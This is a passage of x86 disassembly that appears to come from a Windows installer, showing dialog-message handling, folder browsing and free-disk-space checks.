  404248:	0f 87 b0 00 00 00    	ja     0x4042fe
  40424e:	6a eb                	push   $0xffffffeb
  404250:	ff 75 10             	push   0x10(%ebp)
  404253:	ff 15 9c 81 40 00    	call   *0x40819c
  404259:	8b f0                	mov    %eax,%esi
  40425b:	85 f6                	test   %esi,%esi
  40425d:	0f 84 9b 00 00 00    	je     0x4042fe
  404263:	83 7e 08 01          	cmpl   $0x1,0x8(%esi)
  404267:	0f 87 91 00 00 00    	ja     0x4042fe
  40426d:	83 7e 10 02          	cmpl   $0x2,0x10(%esi)
  404271:	0f 87 87 00 00 00    	ja     0x4042fe
  404277:	8b 4e 14             	mov    0x14(%esi),%ecx
  40427a:	f7 c1 e0 ff ff ff    	test   $0xffffffe0,%ecx
  404280:	75 7c                	jne    0x4042fe
  404282:	8b 06                	mov    (%esi),%eax
  404284:	57                   	push   %edi
  404285:	8b 3d 98 81 40 00    	mov    0x408198,%edi
  40428b:	f6 c1 02             	test   $0x2,%cl
  40428e:	74 03                	je     0x404293
  404290:	50                   	push   %eax
  404291:	ff d7                	call   *%edi
  404293:	f6 46 14 01          	testb  $0x1,0x14(%esi)
  404297:	74 0a                	je     0x4042a3
  404299:	50                   	push   %eax
  40429a:	ff 75 0c             	push   0xc(%ebp)
  40429d:	ff 15 50 80 40 00    	call   *0x408050
  4042a3:	ff 76 10             	push   0x10(%esi)
  4042a6:	ff 75 0c             	push   0xc(%ebp)
  4042a9:	ff 15 54 80 40 00    	call   *0x408054
  4042af:	8b 46 04             	mov    0x4(%esi),%eax
  4042b2:	f6 46 14 08          	testb  $0x8,0x14(%esi)
  4042b6:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4042b9:	74 06                	je     0x4042c1
  4042bb:	50                   	push   %eax
  4042bc:	ff d7                	call   *%edi
  4042be:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4042c1:	f6 46 14 04          	testb  $0x4,0x14(%esi)
  4042c5:	5f                   	pop    %edi
  4042c6:	74 0a                	je     0x4042d2
  4042c8:	50                   	push   %eax
  4042c9:	ff 75 0c             	push   0xc(%ebp)
  4042cc:	ff 15 68 80 40 00    	call   *0x408068
  4042d2:	f6 46 14 10          	testb  $0x10,0x14(%esi)
  4042d6:	74 21                	je     0x4042f9
  4042d8:	8b 46 08             	mov    0x8(%esi),%eax
  4042db:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4042de:	8b 46 0c             	mov    0xc(%esi),%eax
  4042e1:	85 c0                	test   %eax,%eax
  4042e3:	74 07                	je     0x4042ec
  4042e5:	50                   	push   %eax
  4042e6:	ff 15 60 80 40 00    	call   *0x408060
  4042ec:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4042ef:	50                   	push   %eax
  4042f0:	ff 15 5c 80 40 00    	call   *0x40805c
  4042f6:	89 46 0c             	mov    %eax,0xc(%esi)
  4042f9:	8b 46 0c             	mov    0xc(%esi),%eax
  4042fc:	eb 02                	jmp    0x404300
  4042fe:	33 c0                	xor    %eax,%eax
  404300:	5e                   	pop    %esi
  404301:	c9                   	leave
  404302:	c2 0c 00             	ret    $0xc
  404305:	55                   	push   %ebp
  404306:	8b ec                	mov    %esp,%ebp
  404308:	8b 45 08             	mov    0x8(%ebp),%eax
  40430b:	8b 0d fc fc 41 00    	mov    0x41fcfc,%ecx
  404311:	ff 75 10             	push   0x10(%ebp)
  404314:	03 c8                	add    %eax,%ecx
  404316:	51                   	push   %ecx
  404317:	ff 75 0c             	push   0xc(%ebp)
  40431a:	ff 15 ac 80 40 00    	call   *0x4080ac
  404320:	ff 75 0c             	push   0xc(%ebp)
  404323:	ff 15 a0 80 40 00    	call   *0x4080a0
  404329:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40432c:	89 01                	mov    %eax,(%ecx)
  40432e:	01 05 fc fc 41 00    	add    %eax,0x41fcfc
  404334:	33 c0                	xor    %eax,%eax
  404336:	5d                   	pop    %ebp
  404337:	c2 10 00             	ret    $0x10
  40433a:	55                   	push   %ebp
  40433b:	8b ec                	mov    %esp,%ebp
  40433d:	83 ec 0c             	sub    $0xc,%esp
  404340:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404347:	53                   	push   %ebx
  404348:	56                   	push   %esi
  404349:	57                   	push   %edi
  40434a:	0f 85 0c 01 00 00    	jne    0x40445c
  404350:	8b 5d 14             	mov    0x14(%ebp),%ebx
  404353:	8b 7b 30             	mov    0x30(%ebx),%edi
  404356:	85 ff                	test   %edi,%edi
  404358:	7d 11                	jge    0x40436b
  40435a:	8b 0d fc 3e 42 00    	mov    0x423efc,%ecx
  404360:	8d 04 bd 04 00 00 00 	lea    0x4(,%edi,4),%eax
  404367:	2b c8                	sub    %eax,%ecx
  404369:	8b 39                	mov    (%ecx),%edi
  40436b:	a1 78 47 42 00       	mov    0x424778,%eax
  404370:	ff 73 34             	push   0x34(%ebx)
  404373:	03 f8                	add    %eax,%edi
  404375:	6a 22                	push   $0x22
  404377:	0f be 07             	movsbl (%edi),%eax
  40437a:	89 45 14             	mov    %eax,0x14(%ebp)
  40437d:	8b 43 14             	mov    0x14(%ebx),%eax
  404380:	ff 75 08             	push   0x8(%ebp)
  404383:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404387:	8b f0                	mov    %eax,%esi
  404389:	47                   	inc    %edi
  40438a:	f7 d6                	not    %esi
  40438c:	c1 ee 05             	shr    $0x5,%esi
  40438f:	83 e6 01             	and    $0x1,%esi
  404392:	83 e0 01             	and    $0x1,%eax
  404395:	89 7d f4             	mov    %edi,-0xc(%ebp)
  404398:	c7 45 fc 05 43 40 00 	movl   $0x404305,-0x4(%ebp)
  40439f:	0b f0                	or     %eax,%esi
  4043a1:	e8 29 fe ff ff       	call   0x4041cf
  4043a6:	ff 73 38             	push   0x38(%ebx)
  4043a9:	6a 23                	push   $0x23
  4043ab:	ff 75 08             	push   0x8(%ebp)
  4043ae:	e8 1c fe ff ff       	call   0x4041cf
  4043b3:	33 c0                	xor    %eax,%eax
  4043b5:	6a 01                	push   $0x1
  4043b7:	85 f6                	test   %esi,%esi
  4043b9:	0f 94 c0             	sete   %al
  4043bc:	05 0a 04 00 00       	add    $0x40a,%eax
  4043c1:	50                   	push   %eax
  4043c2:	ff 75 08             	push   0x8(%ebp)
  4043c5:	ff 15 a8 81 40 00    	call   *0x4081a8
  4043cb:	56                   	push   %esi
  4043cc:	e8 20 fe ff ff       	call   0x4041f1
  4043d1:	68 e8 03 00 00       	push   $0x3e8
  4043d6:	ff 75 08             	push   0x8(%ebp)
  4043d9:	ff 15 d0 81 40 00    	call   *0x4081d0
  4043df:	8b d8                	mov    %eax,%ebx
  4043e1:	53                   	push   %ebx
  4043e2:	e8 1d fe ff ff       	call   0x404204
  4043e7:	8b 35 00 82 40 00    	mov    0x408200,%esi
  4043ed:	6a 00                	push   $0x0
  4043ef:	6a 01                	push   $0x1
  4043f1:	68 5b 04 00 00       	push   $0x45b
  4043f6:	53                   	push   %ebx
  4043f7:	ff d6                	call   *%esi
  4043f9:	a1 34 47 42 00       	mov    0x424734,%eax
  4043fe:	8b 40 68             	mov    0x68(%eax),%eax
  404401:	85 c0                	test   %eax,%eax
  404403:	7d 09                	jge    0x40440e
  404405:	f7 d8                	neg    %eax
  404407:	50                   	push   %eax
  404408:	ff 15 98 81 40 00    	call   *0x408198
  40440e:	50                   	push   %eax
  40440f:	6a 00                	push   $0x0
  404411:	68 43 04 00 00       	push   $0x443
  404416:	53                   	push   %ebx
  404417:	ff d6                	call   *%esi
  404419:	68 00 00 01 04       	push   $0x4010000
  40441e:	6a 00                	push   $0x0
  404420:	68 45 04 00 00       	push   $0x445
  404425:	53                   	push   %ebx
  404426:	ff d6                	call   *%esi
  404428:	57                   	push   %edi
  404429:	e8 29 1d 00 00       	call   0x406157
  40442e:	33 ff                	xor    %edi,%edi
  404430:	50                   	push   %eax
  404431:	57                   	push   %edi
  404432:	68 35 04 00 00       	push   $0x435
  404437:	53                   	push   %ebx
  404438:	ff d6                	call   *%esi
  40443a:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40443d:	89 3d fc fc 41 00    	mov    %edi,0x41fcfc
  404443:	50                   	push   %eax
  404444:	ff 75 14             	push   0x14(%ebp)
  404447:	68 49 04 00 00       	push   $0x449
  40444c:	53                   	push   %ebx
  40444d:	ff d6                	call   *%esi
  40444f:	89 3d fc fc 41 00    	mov    %edi,0x41fcfc
  404455:	33 c0                	xor    %eax,%eax
  404457:	e9 57 01 00 00       	jmp    0x4045b3
  40445c:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404463:	8b 1d d0 81 40 00    	mov    0x4081d0,%ebx
  404469:	8b 35 00 82 40 00    	mov    0x408200,%esi
  40446f:	75 5a                	jne    0x4044cb
  404471:	8b 45 10             	mov    0x10(%ebp),%eax
  404474:	c1 e8 10             	shr    $0x10,%eax
  404477:	66 85 c0             	test   %ax,%ax
  40447a:	0f 85 24 01 00 00    	jne    0x4045a4
  404480:	33 c0                	xor    %eax,%eax
  404482:	39 05 fc fc 41 00    	cmp    %eax,0x41fcfc
  404488:	0f 85 16 01 00 00    	jne    0x4045a4
  40448e:	8b 0d 08 05 42 00    	mov    0x420508,%ecx
  404494:	8d 79 14             	lea    0x14(%ecx),%edi
  404497:	f6 07 20             	testb  $0x20,(%edi)
  40449a:	0f 84 04 01 00 00    	je     0x4045a4
  4044a0:	50                   	push   %eax
  4044a1:	50                   	push   %eax
  4044a2:	68 f0 00 00 00       	push   $0xf0
  4044a7:	68 0a 04 00 00       	push   $0x40a
  4044ac:	ff 75 08             	push   0x8(%ebp)
  4044af:	ff d3                	call   *%ebx
  4044b1:	50                   	push   %eax
  4044b2:	ff d6                	call   *%esi
  4044b4:	8b 0f                	mov    (%edi),%ecx
  4044b6:	83 e0 01             	and    $0x1,%eax
  4044b9:	83 e1 fe             	and    $0xfffffffe,%ecx
  4044bc:	50                   	push   %eax
  4044bd:	0b c8                	or     %eax,%ecx
  4044bf:	89 0f                	mov    %ecx,(%edi)
  4044c1:	e8 2b fd ff ff       	call   0x4041f1
  4044c6:	e8 ef 00 00 00       	call   0x4045ba
  4044cb:	83 7d 0c 4e          	cmpl   $0x4e,0xc(%ebp)
  4044cf:	0f 85 c0 00 00 00    	jne    0x404595
  4044d5:	68 e8 03 00 00       	push   $0x3e8
  4044da:	ff 75 08             	push   0x8(%ebp)
  4044dd:	ff d3                	call   *%ebx
  4044df:	8b 7d 14             	mov    0x14(%ebp),%edi
  4044e2:	81 7f 08 0b 07 00 00 	cmpl   $0x70b,0x8(%edi)
  4044e9:	75 68                	jne    0x404553
  4044eb:	81 7f 0c 01 02 00 00 	cmpl   $0x201,0xc(%edi)
  4044f2:	75 5f                	jne    0x404553
  4044f4:	8b 4f 1c             	mov    0x1c(%edi),%ecx
  4044f7:	8b 57 18             	mov    0x18(%edi),%edx
  4044fa:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4044fd:	2b ca                	sub    %edx,%ecx
  4044ff:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  404505:	89 55 f4             	mov    %edx,-0xc(%ebp)
  404508:	c7 45 fc c0 36 42 00 	movl   $0x4236c0,-0x4(%ebp)
  40450f:	73 42                	jae    0x404553
  404511:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  404514:	51                   	push   %ecx
  404515:	6a 00                	push   $0x0
  404517:	68 4b 04 00 00       	push   $0x44b
  40451c:	50                   	push   %eax
  40451d:	ff d6                	call   *%esi
  40451f:	8b 3d a4 81 40 00    	mov    0x4081a4,%edi
  404525:	68 02 7f 00 00       	push   $0x7f02
  40452a:	6a 00                	push   $0x0
  40452c:	ff d7                	call   *%edi
  40452e:	8b 1d a0 81 40 00    	mov    0x4081a0,%ebx
  404534:	50                   	push   %eax
  404535:	ff d3                	call   *%ebx
  404537:	6a 01                	push   $0x1
  404539:	ff 75 fc             	push   -0x4(%ebp)
  40453c:	ff 75 08             	push   0x8(%ebp)
  40453f:	e8 9a 00 00 00       	call   0x4045de
  404544:	68 00 7f 00 00       	push   $0x7f00
  404549:	6a 00                	push   $0x0
  40454b:	ff d7                	call   *%edi
  40454d:	50                   	push   %eax
  40454e:	ff d3                	call   *%ebx
  404550:	8b 7d 14             	mov    0x14(%ebp),%edi
  404553:	81 7f 08 00 07 00 00 	cmpl   $0x700,0x8(%edi)
  40455a:	75 4b                	jne    0x4045a7
  40455c:	81 7f 0c 00 01 00 00 	cmpl   $0x100,0xc(%edi)
  404563:	75 42                	jne    0x4045a7
  404565:	83 7f 10 0d          	cmpl   $0xd,0x10(%edi)
  404569:	75 11                	jne    0x40457c
  40456b:	6a 00                	push   $0x0
  40456d:	6a 01                	push   $0x1
  40456f:	68 11 01 00 00       	push   $0x111
  404574:	ff 35 28 47 42 00    	push   0x424728
  40457a:	ff d6                	call   *%esi
  40457c:	83 7f 10 1b          	cmpl   $0x1b,0x10(%edi)
  404580:	75 0e                	jne    0x404590
  404582:	6a 00                	push   $0x0
  404584:	6a 00                	push   $0x0
  404586:	6a 10                	push   $0x10
  404588:	ff 35 28 47 42 00    	push   0x424728
  40458e:	ff d6                	call   *%esi
  404590:	33 c0                	xor    %eax,%eax
  404592:	40                   	inc    %eax
  404593:	eb 1e                	jmp    0x4045b3
  404595:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  40459c:	75 06                	jne    0x4045a4
  40459e:	ff 05 fc fc 41 00    	incl   0x41fcfc
  4045a4:	8b 7d 14             	mov    0x14(%ebp),%edi
  4045a7:	57                   	push   %edi
  4045a8:	ff 75 10             	push   0x10(%ebp)
  4045ab:	ff 75 0c             	push   0xc(%ebp)
  4045ae:	e8 83 fc ff ff       	call   0x404236
  4045b3:	5f                   	pop    %edi
  4045b4:	5e                   	pop    %esi
  4045b5:	5b                   	pop    %ebx
  4045b6:	c9                   	leave
  4045b7:	c2 10 00             	ret    $0x10
  4045ba:	83 3d cc 47 42 00 00 	cmpl   $0x0,0x4247cc
  4045c1:	a1 f8 fc 41 00       	mov    0x41fcf8,%eax
  4045c6:	75 05                	jne    0x4045cd
  4045c8:	a1 2c 0d 42 00       	mov    0x420d2c,%eax
  4045cd:	6a 01                	push   $0x1
  4045cf:	6a 01                	push   $0x1
  4045d1:	68 f4 00 00 00       	push   $0xf4
  4045d6:	50                   	push   %eax
  4045d7:	ff 15 00 82 40 00    	call   *0x408200
  4045dd:	c3                   	ret
  4045de:	55                   	push   %ebp
  4045df:	8b ec                	mov    %esp,%ebp
  4045e1:	83 ec 3c             	sub    $0x3c,%esp
  4045e4:	8b 45 08             	mov    0x8(%ebp),%eax
  4045e7:	83 65 d8 00          	andl   $0x0,-0x28(%ebp)
  4045eb:	83 65 dc 00          	andl   $0x0,-0x24(%ebp)
  4045ef:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4045f2:	8b 45 0c             	mov    0xc(%ebp),%eax
  4045f5:	c7 45 c8 00 05 00 00 	movl   $0x500,-0x38(%ebp)
  4045fc:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4045ff:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  404602:	50                   	push   %eax
  404603:	c7 45 e0 01 00 00 00 	movl   $0x1,-0x20(%ebp)
  40460a:	c7 45 d0 1c a2 40 00 	movl   $0x40a21c,-0x30(%ebp)
  404611:	e8 0d 12 00 00       	call   0x405823
  404616:	c9                   	leave
  404617:	c2 0c 00             	ret    $0xc
  40461a:	55                   	push   %ebp
  40461b:	8b ec                	mov    %esp,%ebp
  40461d:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  404624:	56                   	push   %esi
  404625:	8b 75 14             	mov    0x14(%ebp),%esi
  404628:	75 26                	jne    0x404650
  40462a:	ff 76 30             	push   0x30(%esi)
  40462d:	6a 1d                	push   $0x1d
  40462f:	ff 75 08             	push   0x8(%ebp)
  404632:	e8 98 fb ff ff       	call   0x4041cf
  404637:	8b 46 3c             	mov    0x3c(%esi),%eax
  40463a:	c1 e0 0a             	shl    $0xa,%eax
  40463d:	05 00 50 42 00       	add    $0x425000,%eax
  404642:	50                   	push   %eax
  404643:	68 e8 03 00 00       	push   $0x3e8
  404648:	ff 75 08             	push   0x8(%ebp)
  40464b:	e8 eb 11 00 00       	call   0x40583b
  404650:	56                   	push   %esi
  404651:	ff 75 10             	push   0x10(%ebp)
  404654:	ff 75 0c             	push   0xc(%ebp)
  404657:	e8 da fb ff ff       	call   0x404236
  40465c:	5e                   	pop    %esi
  40465d:	5d                   	pop    %ebp
  40465e:	c2 10 00             	ret    $0x10
  404661:	55                   	push   %ebp
  404662:	8b ec                	mov    %esp,%ebp
  404664:	83 ec 4c             	sub    $0x4c,%esp
  404667:	a1 08 05 42 00       	mov    0x420508,%eax
  40466c:	53                   	push   %ebx
  40466d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404670:	56                   	push   %esi
  404671:	8b 58 3c             	mov    0x3c(%eax),%ebx
  404674:	8b 40 38             	mov    0x38(%eax),%eax
  404677:	c1 e3 0a             	shl    $0xa,%ebx
  40467a:	81 c3 00 50 42 00    	add    $0x425000,%ebx
  404680:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404687:	57                   	push   %edi
  404688:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40468b:	75 11                	jne    0x40469e
  40468d:	53                   	push   %ebx
  40468e:	68 fb 03 00 00       	push   $0x3fb
  404693:	e8 a9 11 00 00       	call   0x405841
  404698:	53                   	push   %ebx
  404699:	e8 0d 1d 00 00       	call   0x4063ab
  40469e:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  4046a5:	8b 75 08             	mov    0x8(%ebp),%esi
  4046a8:	75 6c                	jne    0x404716
  4046aa:	68 fb 03 00 00       	push   $0x3fb
  4046af:	56                   	push   %esi
  4046b0:	ff 15 d0 81 40 00    	call   *0x4081d0
  4046b6:	53                   	push   %ebx
  4046b7:	8b f8                	mov    %eax,%edi
  4046b9:	e8 88 14 00 00       	call   0x405b46
  4046be:	85 c0                	test   %eax,%eax
  4046c0:	74 10                	je     0x4046d2
  4046c2:	53                   	push   %ebx
  4046c3:	e8 aa 14 00 00       	call   0x405b72
  4046c8:	85 c0                	test   %eax,%eax
  4046ca:	75 06                	jne    0x4046d2
  4046cc:	53                   	push   %ebx
  4046cd:	e8 07 14 00 00       	call   0x405ad9
  4046d2:	53                   	push   %ebx
  4046d3:	57                   	push   %edi
  4046d4:	89 35 f8 3e 42 00    	mov    %esi,0x423ef8
  4046da:	ff 15 40 82 40 00    	call   *0x408240
  4046e0:	8b 45 14             	mov    0x14(%ebp),%eax
  4046e3:	ff 70 34             	push   0x34(%eax)
  4046e6:	6a 01                	push   $0x1
  4046e8:	56                   	push   %esi
  4046e9:	e8 e1 fa ff ff       	call   0x4041cf
  4046ee:	8b 45 14             	mov    0x14(%ebp),%eax
  4046f1:	ff 70 30             	push   0x30(%eax)
  4046f4:	6a 14                	push   $0x14
  4046f6:	56                   	push   %esi
  4046f7:	e8 d3 fa ff ff       	call   0x4041cf
  4046fc:	57                   	push   %edi
  4046fd:	e8 02 fb ff ff       	call   0x404204
  404702:	6a 07                	push   $0x7
  404704:	e8 d0 1d 00 00       	call   0x4064d9
  404709:	85 c0                	test   %eax,%eax
  40470b:	0f 84 8c 02 00 00    	je     0x40499d
  404711:	6a 01                	push   $0x1
  404713:	57                   	push   %edi
  404714:	ff d0                	call   *%eax
  404716:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  40471d:	0f 85 d1 00 00 00    	jne    0x4047f4
  404723:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  404727:	3d fb 03 00 00       	cmp    $0x3fb,%eax
  40472c:	75 18                	jne    0x404746
  40472e:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404731:	c1 e9 10             	shr    $0x10,%ecx
  404734:	66 81 f9 00 03       	cmp    $0x300,%cx
  404739:	0f 85 5e 02 00 00    	jne    0x40499d
  40473f:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404746:	3d e9 03 00 00       	cmp    $0x3e9,%eax
  40474b:	0f 85 a3 00 00 00    	jne    0x4047f4
  404751:	6a 07                	push   $0x7
  404753:	33 c0                	xor    %eax,%eax
  404755:	59                   	pop    %ecx
  404756:	8d 7d b8             	lea    -0x48(%ebp),%edi
  404759:	ff 75 f8             	push   -0x8(%ebp)
  40475c:	f3 ab                	rep stos %eax,%es:(%edi)
  40475e:	bf 30 0d 42 00       	mov    $0x420d30,%edi
  404763:	68 08 01 42 00       	push   $0x420108
  404768:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  40476b:	89 7d bc             	mov    %edi,-0x44(%ebp)
  40476e:	c7 45 c8 b2 49 40 00 	movl   $0x4049b2,-0x38(%ebp)
  404775:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  404778:	e8 e6 19 00 00       	call   0x406163
  40477d:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404780:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  404783:	50                   	push   %eax
  404784:	c7 45 c4 41 00 00 00 	movl   $0x41,-0x3c(%ebp)
  40478b:	ff 15 74 81 40 00    	call   *0x408174
  404791:	85 c0                	test   %eax,%eax
  404793:	74 58                	je     0x4047ed
  404795:	50                   	push   %eax
  404796:	ff 15 88 82 40 00    	call   *0x408288
  40479c:	53                   	push   %ebx
  40479d:	e8 37 13 00 00       	call   0x405ad9
  4047a2:	a1 34 47 42 00       	mov    0x424734,%eax
  4047a7:	8b 80 1c 01 00 00    	mov    0x11c(%eax),%eax
  4047ad:	85 c0                	test   %eax,%eax
  4047af:	74 28                	je     0x4047d9
  4047b1:	81 fb 00 a4 42 00    	cmp    $0x42a400,%ebx
  4047b7:	75 20                	jne    0x4047d9
  4047b9:	50                   	push   %eax
  4047ba:	6a 00                	push   $0x0
  4047bc:	e8 a2 19 00 00       	call   0x406163
  4047c1:	57                   	push   %edi
  4047c2:	bf c0 36 42 00       	mov    $0x4236c0,%edi
  4047c7:	57                   	push   %edi
  4047c8:	ff 15 18 81 40 00    	call   *0x408118
  4047ce:	85 c0                	test   %eax,%eax
  4047d0:	74 07                	je     0x4047d9
  4047d2:	57                   	push   %edi
  4047d3:	53                   	push   %ebx
  4047d4:	e8 84 19 00 00       	call   0x40615d
  4047d9:	ff 05 20 0d 42 00    	incl   0x420d20
  4047df:	53                   	push   %ebx
  4047e0:	68 fb 03 00 00       	push   $0x3fb
  4047e5:	56                   	push   %esi
  4047e6:	e8 50 10 00 00       	call   0x40583b
  4047eb:	eb 07                	jmp    0x4047f4
  4047ed:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  4047f4:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  4047fb:	74 0d                	je     0x40480a
  4047fd:	81 7d 0c 05 04 00 00 	cmpl   $0x405,0xc(%ebp)
  404804:	0f 85 93 01 00 00    	jne    0x40499d
  40480a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40480e:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  404812:	53                   	push   %ebx
  404813:	68 fb 03 00 00       	push   $0x3fb
  404818:	e8 24 10 00 00       	call   0x405841
  40481d:	53                   	push   %ebx
  40481e:	e8 a4 13 00 00       	call   0x405bc7
  404823:	85 c0                	test   %eax,%eax
  404825:	75 07                	jne    0x40482e
  404827:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40482e:	be 00 fd 41 00       	mov    $0x41fd00,%esi
  404833:	53                   	push   %ebx
  404834:	56                   	push   %esi
  404835:	e8 07 19 00 00       	call   0x406141
  40483a:	6a 01                	push   $0x1
  40483c:	e8 98 1c 00 00       	call   0x4064d9
  404841:	85 c0                	test   %eax,%eax
  404843:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404846:	74 35                	je     0x40487d
  404848:	33 c0                	xor    %eax,%eax
  40484a:	33 ff                	xor    %edi,%edi
  40484c:	3b c6                	cmp    %esi,%eax
  40484e:	74 2d                	je     0x40487d
  404850:	8d 45 dc             	lea    -0x24(%ebp),%eax
  404853:	50                   	push   %eax
  404854:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404857:	50                   	push   %eax
  404858:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40485b:	50                   	push   %eax
  40485c:	56                   	push   %esi
  40485d:	ff 55 f4             	call   *-0xc(%ebp)
  404860:	85 c0                	test   %eax,%eax
  404862:	75 71                	jne    0x4048d5
  404864:	85 ff                	test   %edi,%edi
  404866:	74 02                	je     0x40486a
  404868:	20 07                	and    %al,(%edi)
  40486a:	56                   	push   %esi
  40486b:	e8 b0 12 00 00       	call   0x405b20
  404870:	8b f8                	mov    %eax,%edi
  404872:	80 27 00             	andb   $0x0,(%edi)
  404875:	4f                   	dec    %edi
  404876:	3b fe                	cmp    %esi,%edi
  404878:	c6 07 5c             	movb   $0x5c,(%edi)
  40487b:	75 d3                	jne    0x404850
  40487d:	53                   	push   %ebx
  40487e:	56                   	push   %esi
  40487f:	e8 bd 18 00 00       	call   0x406141
  404884:	56                   	push   %esi
  404885:	e8 e8 12 00 00       	call   0x405b72
  40488a:	33 ff                	xor    %edi,%edi
  40488c:	3b c7                	cmp    %edi,%eax
  40488e:	74 03                	je     0x404893
  404890:	80 20 00             	andb   $0x0,(%eax)
  404893:	8d 45 e0             	lea    -0x20(%ebp),%eax
  404896:	50                   	push   %eax
  404897:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40489a:	50                   	push   %eax
  40489b:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40489e:	50                   	push   %eax
  40489f:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4048a2:	50                   	push   %eax
  4048a3:	56                   	push   %esi
  4048a4:	ff 15 20 81 40 00    	call   *0x408120
  4048aa:	85 c0                	test   %eax,%eax
  4048ac:	74 43                	je     0x4048f1
  4048ae:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4048b1:	be 00 04 00 00       	mov    $0x400,%esi
  4048b6:	0f af 45 ec          	imul   -0x14(%ebp),%eax
  4048ba:	56                   	push   %esi
  4048bb:	ff 75 f4             	push   -0xc(%ebp)
  4048be:	50                   	push   %eax
  4048bf:	ff 15 44 81 40 00    	call   *0x408144
  4048c5:	99                   	cltd
  4048c6:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4048c9:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4048cc:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4048d3:	eb 21                	jmp    0x4048f6
  4048d5:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4048d8:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4048db:	0f ac c8 0a          	shrd   $0xa,%ecx,%eax
  4048df:	c1 e9 0a             	shr    $0xa,%ecx
  4048e2:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4048e5:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4048e8:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  4048ef:	33 ff                	xor    %edi,%edi
  4048f1:	be 00 04 00 00       	mov    $0x400,%esi
  4048f6:	6a 05                	push   $0x5
  4048f8:	e8 f8 01 00 00       	call   0x404af5
  4048fd:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404900:	74 19                	je     0x40491b
  404902:	8b 55 d8             	mov    -0x28(%ebp),%edx
  404905:	33 c9                	xor    %ecx,%ecx
  404907:	3b d1                	cmp    %ecx,%edx
  404909:	77 10                	ja     0x40491b
  40490b:	72 07                	jb     0x404914
  40490d:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  404910:	3b c8                	cmp    %eax,%ecx
  404912:	73 07                	jae    0x40491b
  404914:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  40491b:	8b 0d fc 3e 42 00    	mov    0x423efc,%ecx
  404921:	39 79 10             	cmp    %edi,0x10(%ecx)
  404924:	74 30                	je     0x404956
  404926:	50                   	push   %eax
  404927:	6a fb                	push   $0xfffffffb
  404929:	68 ff 03 00 00       	push   $0x3ff
  40492e:	e8 aa 01 00 00       	call   0x404add
  404933:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  404936:	74 10                	je     0x404948
  404938:	ff 75 d8             	push   -0x28(%ebp)
  40493b:	ff 75 d4             	push   -0x2c(%ebp)
  40493e:	6a fc                	push   $0xfffffffc
  404940:	56                   	push   %esi
  404941:	e8 d2 00 00 00       	call   0x404a18
  404946:	eb 0e                	jmp    0x404956
  404948:	68 f0 fc 41 00       	push   $0x41fcf0
  40494d:	56                   	push   %esi
  40494e:	ff 75 08             	push   0x8(%ebp)
  404951:	e8 e5 0e 00 00       	call   0x40583b
  404956:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404959:	3b c7                	cmp    %edi,%eax
  40495b:	a3 e4 47 42 00       	mov    %eax,0x4247e4
  404960:	75 0a                	jne    0x40496c
  404962:	6a 07                	push   $0x7
  404964:	e8 a2 ca ff ff       	call   0x40140b
  404969:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40496c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40496f:	85 70 14             	test   %esi,0x14(%eax)
  404972:	74 03                	je     0x404977
  404974:	89 7d fc             	mov    %edi,-0x4(%ebp)
  404977:	33 c0                	xor    %eax,%eax
  404979:	39 7d fc             	cmp    %edi,-0x4(%ebp)
  40497c:	0f 94 c0             	sete   %al
  40497f:	50                   	push   %eax
  404980:	e8 6c f8 ff ff       	call   0x4041f1
  404985:	39 7d fc             	cmp    %edi,-0x4(%ebp)
